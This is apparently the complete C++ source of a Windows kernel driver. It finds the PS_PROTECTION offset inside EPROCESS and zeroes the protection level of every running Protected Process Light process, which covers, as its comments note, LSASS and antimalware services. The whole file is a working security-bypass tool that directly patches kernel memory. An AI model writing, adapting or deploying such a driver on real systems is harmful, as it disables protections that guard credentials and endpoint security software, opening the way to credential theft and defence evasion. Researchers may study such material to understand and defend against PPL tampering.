#include <wdm.h>
#include "procinfo.h"
#include <stdio.h>
#include <stdarg.h>

extern "C"
{
	DRIVER_INITIALIZE DriverEntry;
	DRIVER_UNLOAD DriverUnload;
	_Dispatch_type_(IRP_MJ_CREATE) _Dispatch_type_(IRP_MJ_CLOSE) DRIVER_DISPATCH DriverCreateClose;

	VOID
	Log(
		_In_ PCCH Format,
		_In_ ...
	);

	NTSTATUS
	FindPsProtectionOffset(
		_Out_ PULONG PsProtectionOffset
		);

	NTSTATUS
	UnprotectProcesses(
		_In_ ULONG PsProtectionOffset,
		_Out_ PULONG NumProcessesUnprotected
		);
}

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, Log)
#pragma alloc_text(PAGE, FindPsProtectionOffset)
#pragma alloc_text(PAGE, UnprotectProcesses)
#pragma alloc_text(PAGE, DriverUnload)
#pragma alloc_text(INIT, DriverEntry)
#endif

VOID
Log(
	_In_ PCCH Format,
	_In_ ...
	)
{
	PAGED_CODE();

	CHAR Message[512];
	va_list VaList;
	va_start(VaList, Format);
	ULONG N = _vsnprintf_s(Message, sizeof(Message), Format, VaList);
	Message[N] = '\0';
	va_end(Format);
	vDbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, Message, VaList);
}

VOID
DriverUnload(
	_In_ PDRIVER_OBJECT DriverObject
	)
{
	UNREFERENCED_PARAMETER(DriverObject);
	PAGED_CODE();
	Log("Driver unloaded.\n");
}

NTSTATUS
DriverCreateClose(
	_In_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
	)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

// This can be done faster and in fewer lines of code by ghetto-disassembling
// PsIsProtectedProcess, but this method should hopefully be more robust
NTSTATUS
FindPsProtectionOffset(
	_Out_ PULONG PsProtectionOffset
	)
{
	PAGED_CODE();

	*PsProtectionOffset = 0;

	// Since the EPROCESS struct is opaque and we don't know its size, allocate for 4K possible offsets
	PULONG CandidateOffsets = static_cast<PULONG>(
		ExAllocatePoolWithTag(NonPagedPoolNx,
							PAGE_SIZE * sizeof(ULONG),
							'LPPK'));
	if (CandidateOffsets == nullptr)
		return STATUS_NO_MEMORY;
	RtlZeroMemory(CandidateOffsets, sizeof(ULONG) * PAGE_SIZE);
	
	ULONG NumProtectedProcesses = 0;
	HANDLE ProcessHandle = nullptr;
	NTSTATUS Status = STATUS_SUCCESS;

	// Enumerate all processes
	while (NT_SUCCESS(ZwGetNextProcess(ProcessHandle,
										PROCESS_QUERY_LIMITED_INFORMATION,
										OBJ_KERNEL_HANDLE,
										0,
										&ProcessHandle)))
	{
		// Query the process's protection status
		PS_PROTECTION ProtectionInfo;
		Status = ZwQueryInformationProcess(ProcessHandle,
											ProcessProtectionInformation,
											&ProtectionInfo,
											sizeof(ProtectionInfo),
											nullptr);

		// If it's protected (light or otherwise), get the EPROCESS
		if (NT_SUCCESS(Status) && ProtectionInfo.Level > 0)
		{
			PEPROCESS Process;
			Status = ObReferenceObjectByHandle(ProcessHandle,
											PROCESS_QUERY_LIMITED_INFORMATION,
											*PsProcessType,
											KernelMode,
											reinterpret_cast<PVOID*>(&Process),
											nullptr);
			if (NT_SUCCESS(Status))
			{
				// Find offsets in the EPROCESS that are a match for the PS_PROTECTION we got
				ULONG_PTR End = ALIGN_UP_BY(Process, PAGE_SIZE) - reinterpret_cast<ULONG_PTR>(Process);
				for (ULONG_PTR i = 0; i < End; ++i)
				{
					PPS_PROTECTION Candidate = reinterpret_cast<PPS_PROTECTION>(reinterpret_cast<PUCHAR>(Process) + i);
					if (Candidate->Level == ProtectionInfo.Level)
						CandidateOffsets[i]++;
				}
				NumProtectedProcesses++;
				ObfDereferenceObject(Process);
			}
		}
		ZwClose(ProcessHandle);
	}

	// Go over the possible offsets to find the one that is correct for all processes
	ULONG Offset = 0;
	ULONG BestMatchCount = 0;
	for (ULONG i = 0; i < PAGE_SIZE; ++i)
	{
		if (CandidateOffsets[i] > BestMatchCount)
		{
			if (BestMatchCount == NumProtectedProcesses)
			{
				Log("Found multiple offsets that match all processes! You should uninstall some rootkits.\n");
				Status = STATUS_NOT_FOUND;
				goto finished;
			}
			Offset = i;
			BestMatchCount = CandidateOffsets[i];
		}
	}

	if (BestMatchCount == 0)
	{
		Log("Did not find any possible offsets for the PS_PROTECTION field.\n");
		Status = STATUS_NOT_FOUND;
		goto finished;
	}

	if (BestMatchCount != NumProtectedProcesses)
	{
		Log("Best found offset match +0x02X is only valid for %u of %u protected processes.\n",
			Offset, BestMatchCount, NumProtectedProcesses);
		Status = STATUS_NOT_FOUND;
		goto finished;
	}

	Log("Found PS_PROTECTION offset +0x%02X.\n", Offset);
	*PsProtectionOffset = Offset;

finished:
	ExFreePool(CandidateOffsets);
	return Status;
}

NTSTATUS
UnprotectProcesses(
	_In_ ULONG PsProtectionOffset,
	_Out_ PULONG NumProcessesUnprotected
	)
{
	PAGED_CODE();

	*NumProcessesUnprotected = 0;

	// Query all running processes
	NTSTATUS Status;
	ULONG Size;
	PSYSTEM_PROCESS_INFORMATION SystemProcessInfo = nullptr;
	if ((Status = ZwQuerySystemInformation(SystemProcessInformation,
											SystemProcessInfo,
											0,
											&Size)) != STATUS_INFO_LENGTH_MISMATCH)
		goto finished;
	SystemProcessInfo = static_cast<PSYSTEM_PROCESS_INFORMATION>(
		ExAllocatePoolWithTag(NonPagedPoolNx,
							2 * Size,
							'LPPK'));
	if (SystemProcessInfo == nullptr)
	{
		Status = STATUS_NO_MEMORY;
		goto finished;
	}
	Status = ZwQuerySystemInformation(SystemProcessInformation,
										SystemProcessInfo,
										2 * Size,
										nullptr);
	if (!NT_SUCCESS(Status))
		return Status;

	// Enumerate the process list
	PSYSTEM_PROCESS_INFORMATION Entry = SystemProcessInfo;
	while (Entry->NextEntryOffset != 0)
	{
		PEPROCESS Process;
		Status = PsLookupProcessByProcessId(Entry->UniqueProcessId,
											&Process);
		if (NT_SUCCESS(Status))
		{
			PPS_PROTECTION PsProtection = reinterpret_cast<PPS_PROTECTION>(
				reinterpret_cast<PUCHAR>(Process) + PsProtectionOffset);

			// Skip non-light protected processes (i.e. System).
			// You could also discriminate by signer, e.g. to leave LSASS or antimalware protection enabled
			if (PsProtection->Level != 0)
			{
				Log("PID %u (%wZ) at 0x%p is a PPL: { type: %u, audit: %u, signer: %u }.\n",
					HandleToULong(Entry->UniqueProcessId), &Entry->ImageName, Process,
					PsProtection->s.Type, PsProtection->s.Audit, PsProtection->s.Signer);
				
				// Goodnight sweet prince
				PsProtection->Level = 0;
				(*NumProcessesUnprotected)++;
				Log("Protection removed.\n");
			}

			ObfDereferenceObject(Process);
		}

		Entry = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<ULONG_PTR>(Entry) +
																Entry->NextEntryOffset);
	}

finished:
	if (SystemProcessInfo != nullptr)
		ExFreePool(SystemProcessInfo);
	return Status;
}

NTSTATUS
DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath
	)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	PAGED_CODE();
	
	OSVERSIONINFOEXW VersionInfo = { sizeof(OSVERSIONINFOEXW) };
	NTSTATUS Status = RtlGetVersion(reinterpret_cast<PRTL_OSVERSIONINFOW>(&VersionInfo));
	if (!NT_SUCCESS(Status))
		return Status;

	// Only Windows 8.1 and later are afflicted with PPL.
	if (VersionInfo.dwMajorVersion < 6 ||
		(VersionInfo.dwMajorVersion == 6 && VersionInfo.dwMinorVersion < 3))
	{
		Log("Unsupported OS version. Be glad!\n");
		return STATUS_NOT_SUPPORTED;
	}

	// Find the offset of the PS_PROTECTION field for the running kernel
	ULONG PsProtectionOffset;
	Status = FindPsProtectionOffset(&PsProtectionOffset);
	if (!NT_SUCCESS(Status))
	{
		Log("Failed to find the PS_PROTECTION offset for Windows %u.%u.%u.\n",
			VersionInfo.dwMajorVersion, VersionInfo.dwMinorVersion, VersionInfo.dwBuildNumber);
		return Status;
	}

	// Remove protection from all running PPL processes
	ULONG NumUnprotected;
	Status = UnprotectProcesses(PsProtectionOffset,
								&NumUnprotected);
	if (!NT_SUCCESS(Status))
	{
		Log("Error %08X\n", Status);
		return Status;
	}
	Log("Success. Removed PPL protection from %u processes.\n", NumUnprotected);

	// Set driver callback functions
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverCreateClose;
	DriverObject->DriverUnload = DriverUnload;

	Log("Driver loaded successfully. You can unload it again now since it doesn't do anything.\n");

	return STATUS_SUCCESS;
}
